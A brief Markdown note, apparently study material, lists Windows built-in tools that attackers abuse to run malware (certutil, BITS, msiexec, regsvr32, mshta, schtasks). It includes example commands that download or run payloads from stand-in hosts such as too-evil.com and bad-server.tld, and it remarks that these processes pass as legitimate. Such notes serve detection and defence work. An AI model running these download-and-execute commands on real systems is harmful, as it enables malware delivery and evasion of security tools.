# Windows


## Used Windows tools

Windows has some tools which facilitate running malware:

**CertUtil.exe  (tool to manage certificates)**
    - can download certificate (PEM) from url
    - `certutil -urlcache -f <url> malicious1.txt` -> download
    - `certutil -decode malicious1.txt malicious.gzip` decode

**BitsTransfer (Service "Background Intelligent Transfer Service)**
    - Service to transfer data between server and client
    - via powershell download file: `Start-BitsTransfer -Source http://bad-server.tld/payload.exe -Destination %APPDATA%/o.exe`

**Msiexec (for msi)**
    - to run msi files
    - Advantages: process is msiexec and considered legitimate, payload is in msi file and usually considered clean

**regsvr32.exe (register dll's)**
    - File can be downloaded and executed. Example: `regsvr32 /u /s /i:https://too-evil.com/payload.php scrobj.dll`
        - process would be regsvr32, which is usually considered legitimate

**mshta.exe (tool to run hta scripts)**
    - HTA scripts are html like applications that can run outside the browsers
    - example: `mshta http://too-evil.com/payload.php` (process will be mshta.exe which is considered legitimate)

**schtasks (Windows task scheduler)**
    - Service "Task Scheduler"
    - is not only used to run but also to persist malware


